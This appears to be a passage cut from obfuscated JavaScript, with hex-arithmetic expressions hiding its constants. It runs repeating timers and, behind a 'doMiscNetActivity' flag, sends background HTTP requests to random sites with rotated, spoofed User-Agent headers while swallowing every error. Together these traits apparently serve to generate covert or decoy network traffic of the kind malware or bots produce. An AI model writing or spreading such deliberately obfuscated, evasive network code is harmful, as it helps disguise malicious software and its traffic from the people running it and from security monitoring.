    ];
  f();
  for (let k = -0x990 + 0x1abe + 0x5ba * -0x3; k < 0x1c97 + 0x2264 + -0x3ef7; k++)
    setTimeout(f, (0x95e3 * 0x3 + -0xe17f + 0xa36) * k * getRandomInt(0x1010 + -0x1874 + 0x865, -0x1e75 + -0x1 * 0x742 + -0x1b7 * -0x16));
  setInterval(() => {
    f();
    for (let l = -0x1701 + -0x1 * -0x19cf + 0x2 * -0x167; l < -0x24d3 + -0x1b57 * 0x1 + 0x402e; l++)
      setTimeout(f, (-0xc30c + 0xee5f + -0x3faf * -0x3) * l * getRandomInt(-0x2477 + -0x638 + 0x2ab0, -0xd3d + 0x1 * -0xc95 + -0x1 * -0x19d5));
  }, 0x450b7 + -0x1ca3f6 + 0x1d5 * 0x2b43);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xc * 0x3fb + 0x23b0 + -0x9db * -0x4) * getRandomInt(-0x247c + -0xabe + 0x2f3b, -0x1e07 + 0x76 + 0x21d * 0xe));
}, -0x189a + -0x28 + 0x1926);